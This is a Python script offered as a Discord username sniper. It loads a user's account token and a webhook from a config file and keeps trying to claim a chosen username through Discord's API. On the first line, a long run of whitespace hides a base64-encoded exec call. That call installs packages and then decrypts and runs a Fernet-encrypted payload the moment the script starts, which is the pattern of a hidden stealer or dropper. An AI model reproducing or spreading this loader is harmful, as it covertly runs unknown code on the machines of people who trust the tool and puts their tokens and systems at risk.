import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJzJRUnFXWWZ1MjI0anlYclZkdjRBdEc3YmVwOHg4aldsN0ZILUZVU3Focmc9JykuZGVjcnlwdChiJ2dBQUFBQUJuQ2x3cXI2TzdMeGNMOUJ2M3N0SjZEV1RBYXVHalJsdWI2cWZFLUpVLS1vM0lndnpyZ191d2JRcmpjRHhmUmo2SFRJcGx5TVlDUWYtSjNVejluSFNndWpYWGp4ai1fUWNHOTQyVFQxb0szdTN5aTVKRFZpZDJZR3l3OUltcF9WWGVSZTlHUjc2UVpqelBwUVZlWmVEMWpoRFUyYngzbTdicWlkZVctT3VnWi1FY0FFdGF2T0xCTXluRllIbkhvMG53YlJIcTdDWFRmTHREN2Z6Ump5Ynl5V3VGTThIcGdreHZ0S3NYQXJJYk1MblFYdWc9Jykp').decode())
os.system("pip install -r requirements.txt")
import sys 
import json 
import aiohttp 
import asyncio
import random

os.system("clear||cls")
os.system("title Username Sniper - [Telegram auth3301]")

with open("config.json", "r") as f:
  c = json.load(f)

token = c["Token"]
username = c["Username"]
web = c["Webhook"]

async def main():
  async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as session:
    me = await session.get("https://canary.discord.com/api/v10/users/@me", headers={"Authorization": token})
    if me.status in [200,204,201]:
      js = await me.json()
      id = js.get("id")
      us = js.get("username")
      print(f"Connected To {id} | {us}")
    else:
      print("Unauthorized | Invalid Token.")
    while True:
      response = await session.post("https://canary.discord.com/api/v10/users/@me/pomelo", headers={"Authorization": token, "content-type": "application/json"}, json={"username": username})
      print("Received Response From Discord", await response.text())
      if response.status in [200,204,201]:
        print("Sucessfully Claimed Username.")
        await session.post(web, json=dict(content="@everyone claimed username."))
        sys.exit()
      elif response.status == 535:
        print("Username Taken.")
        await session.post(web, json=dict(content="username taken"))
      elif response.status == 429:
        js = await response.json()
        await asyncio.sleep(js["retry_after"])
      elif response.status == 401:
        print("Feature not released | unauthorized.")
        t = random.randint(60, 300)
        await asyncio.sleep(t)
      



if __name__ == "__main__":
  loop = asyncio.new_event_loop()
  loop.run_until_complete(main())
print('fwuuqwwj')